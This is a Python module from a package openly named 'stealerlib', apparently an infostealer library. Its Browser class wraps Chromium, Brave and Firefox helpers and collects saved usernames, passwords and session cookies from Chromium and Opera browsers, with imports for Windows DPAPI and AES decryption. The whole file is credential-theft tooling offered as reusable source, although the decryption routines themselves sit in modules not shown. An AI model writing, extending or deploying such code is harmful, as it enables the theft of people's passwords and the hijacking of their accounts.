#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
    @author:  codeuk
    @package: stealerlib/browser/__init__.py
"""

import os
import json
import base64
import shutil
import sqlite3
import tempfile
import win32crypt

from typing import Union
from Cryptodome.Cipher import AES
from datetime import datetime, timedelta

from stealerlib.exceptions import *
from stealerlib.browser.brave import Brave
from stealerlib.browser.firefox import Firefox
from stealerlib.browser.chromium import Chromium


class Browser(Chromium, Brave, Firefox):

    def __init__(self):
        Brave.__init__(self)
        Firefox.__init__(self)
        Chromium.__init__(self)

    def get_passwords(self, type="all") -> Union[list[tuple], list[list]]:
        """Gets the saved userames and passwords for the specific browser type

        Parameters:
            self (object): The object passed to the method
            type (str): Browser type to collect cookies from (default=all)

        Returns:
            list[tuple[str, ...]]: list of (username, password, url, created, last_used) tuples 

        Example:
            browser = Browser()
            browser.get_passwords()
        """

        if type == "chromium":
            self.get_passwords_chromium()
        elif type == "opera":
            self.get_passwords_opera()
        else:
            self.get_passwords_chromium()
            self.get_passwords_opera()

        return self.passwords

    def get_cookies(self, type="all") -> Union[list[tuple], list[list]]:
        """Gets the saved cookies for the specific browser type

        Parameters:
            self (object): The object passed to the method
            type (str): Browser type to collect cookies from (default=all)

        Returns:
            list[tuple[str, ...]]: List of (cookie, site_url) tuples

        Example:
            browser = Browser()
            browser.get_cookies()
        """

        if type == "chromium":
            self.get_cookies_chromium()
        elif type == "opera":
            self.get_cookies_opera()
        else:
            self.get_cookies_chromium()
            self.get_cookies_opera()

        return self.cookies


